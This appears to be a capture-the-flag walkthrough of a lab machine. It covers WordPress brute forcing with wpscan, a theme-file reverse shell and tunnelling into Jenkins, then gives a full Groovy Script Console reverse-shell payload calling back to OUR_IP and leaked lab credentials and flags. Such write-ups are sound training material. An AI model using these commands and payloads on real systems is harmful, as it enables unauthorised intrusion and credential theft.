---
sticker: lucide//network
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250529134856.png](../../IMAGES/Pasted%20image%2020250529134856.png)

We got a simple apache2 ubuntu page, source code is normal too, let's fuzz then:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://internal.thm/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://internal.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wordpress [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 175ms]
blog [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 5371ms]
javascript [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 174ms]
phpmyadmin [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 180ms]
```

Well we got some stuff, let's check it out:


![Pasted image 20250529135321.png](../../IMAGES/Pasted%20image%2020250529135321.png)

We can see that on `/wordpress`, interesting part is the search bar, as we can see, there is something written that says:

```
It looks like nothing was found at this location. Maybe try a search?
```

I tried `XSS` and `LFI` on here but none worked, so I tried searching for `wordpress` and this happened:


![Pasted image 20250529135808.png](../../IMAGES/Pasted%20image%2020250529135808.png)

If we go to `your dashboard`, we get this url:

![Pasted image 20250529135828.png](../../IMAGES/Pasted%20image%2020250529135828.png)

Seems like an internal resource, if we got `SSRF` we can maybe get access to that panel, but there's no need, since we know we are dealing with a `wordpress` site, best approach would be using `wpscan` to enumerate all possible attack vectors:

```
wpscan --url http://internal.thm/blog -e vp,u
```

Nothing too important can be found rather than there's an user on here:

```
admin
```

We find this also inside of the `hello world!` post inside of `/blog`:

![Pasted image 20250529140149.png](../../IMAGES/Pasted%20image%2020250529140149.png)


Knowing this info, we can try brute forcing using `wpscan` too, there's a `wp-login.php` page we can find:

![Pasted image 20250529140506.png](../../IMAGES/Pasted%20image%2020250529140506.png)

![Pasted image 20250529140518.png](../../IMAGES/Pasted%20image%2020250529140518.png)

Let's proceed with exploitation.


# EXPLOITATION
---

We need to brute force, let's use this command:

```
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

It will take some time, after it finishes we get:


![Pasted image 20250529141114.png](../../IMAGES/Pasted%20image%2020250529141114.png)


We got credentials: 

```
admin:my2boys
```


![Pasted image 20250529141427.png](../../IMAGES/Pasted%20image%2020250529141427.png)

![Pasted image 20250529141513.png](../../IMAGES/Pasted%20image%2020250529141513.png)

As seen, we got access to the admin panel, on here, we can check this on the posts:

![Pasted image 20250529141550.png](../../IMAGES/Pasted%20image%2020250529141550.png)

![Pasted image 20250529141610.png](../../IMAGES/Pasted%20image%2020250529141610.png)

We got a reminder to reset `will's` credentials, we got:

```
william:arnold147
```

I tried these at ssh but no luck, seems like we need to get a reverse shell through the themes as usual, let's do it:

![Pasted image 20250529141847.png](../../IMAGES/Pasted%20image%2020250529141847.png)

On here, add a reverse shell:


![Pasted image 20250529141925.png](../../IMAGES/Pasted%20image%2020250529141925.png)

Update the file and go to, we need to have our listener ready:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![Pasted image 20250529142034.png](../../IMAGES/Pasted%20image%2020250529142034.png)

We got our reverse shell, let's begin privilege escalation.

# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250529142155.png](../../IMAGES/Pasted%20image%2020250529142155.png)

There we go, now we can look around, let's use `linpeas`:

![Pasted image 20250529142819.png](../../IMAGES/Pasted%20image%2020250529142819.png)

Let's read it:

```
www-data@internal:/tmp$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later. Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

We got credentials for ssh:


![Pasted image 20250529142909.png](../../IMAGES/Pasted%20image%2020250529142909.png)

We can now read `user.txt`:

```
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

On our home directory, we can find this:

```
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug 3 2020 .
drwxr-xr-x 3 root root 4096 Aug 3 2020 ..
-rwx------ 1 aubreanna aubreanna 7 Aug 3 2020 .bash_history
-rwx------ 1 aubreanna aubreanna 220 Apr 4 2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr 4 2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug 3 2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug 3 2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug 3 2020 .local
-rwx------ 1 root root 223 Aug 3 2020 .mysql_history
-rwx------ 1 aubreanna aubreanna 807 Apr 4 2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug 3 2020 .ssh
-rwx------ 1 aubreanna aubreanna 0 Aug 3 2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna 55 Aug 3 2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug 3 2020 snap
-rwx------ 1 aubreanna aubreanna 21 Aug 3 2020 user.txt

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

We can verify this using:

```
aubreanna@internal:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.1:34195 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
tcp6 0 0 :::80 :::* LISTEN - 
tcp6 0 0 :::22 :::* LISTEN - 
udp 0 0 127.0.0.53:53 0.0.0.0:* - 
udp 0 0 10.10.78.152:68 0.0.0.0:* -
```

Knowing this, we can use ssh tunnels to get the contents of the jenkins website on our machine, let's do:

```
ssh -L 8888:172.17.0.2:8080 aubreanna@internal.thm
```

We can now access it at:

```
http://localhost:8888
```

![Pasted image 20250529143436.png](../../IMAGES/Pasted%20image%2020250529143436.png)

I tried same credentials as ssh but they didn't work, we need to bruteforce using either burp or caido, I will use caido because it's faster, capture the request and do:

![Pasted image 20250529143832.png](../../IMAGES/Pasted%20image%2020250529143832.png)

We can see our request, let's send it to automate:

![Pasted image 20250529144006.png](../../IMAGES/Pasted%20image%2020250529144006.png)

![Pasted image 20250529144538.png](../../IMAGES/Pasted%20image%2020250529144538.png)

Run it and check:

![Pasted image 20250529144940.png](../../IMAGES/Pasted%20image%2020250529144940.png)

Length on that one is different, credentials are:

```
admin:spongebob
```

![Pasted image 20250529145030.png](../../IMAGES/Pasted%20image%2020250529145030.png)

Inside of `jenkins`, we can use `Script Console` to get ourselves a reverse shell as `jenkins`, let's do it:

![Pasted image 20250529145112.png](../../IMAGES/Pasted%20image%2020250529145112.png)

![Pasted image 20250529145118.png](../../IMAGES/Pasted%20image%2020250529145118.png)

![Pasted image 20250529145132.png](../../IMAGES/Pasted%20image%2020250529145132.png)

As seen, this is being managed by groovy, we can guide ourselves on this medium post:

```
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
```

![Pasted image 20250529145235.png](../../IMAGES/Pasted%20image%2020250529145235.png)

```java
String host="OUR_IP";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


Once we run this on the console, we get a reverse shell:

![Pasted image 20250529145512.png](../../IMAGES/Pasted%20image%2020250529145512.png)

Let's stabilize our shell once again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We can use `linpeas` again:

![Pasted image 20250529145945.png](../../IMAGES/Pasted%20image%2020250529145945.png)

Once again, in `/opt` we got a note:

```
jenkins@jenkins:/tmp$ cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

We got credentials for root, let's go into ssh session then:

![Pasted image 20250529150034.png](../../IMAGES/Pasted%20image%2020250529150034.png)

We can now read root flag and finish the room:

```
root@internal:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
```


![Pasted image 20250529150108.png](../../IMAGES/Pasted%20image%2020250529150108.png)


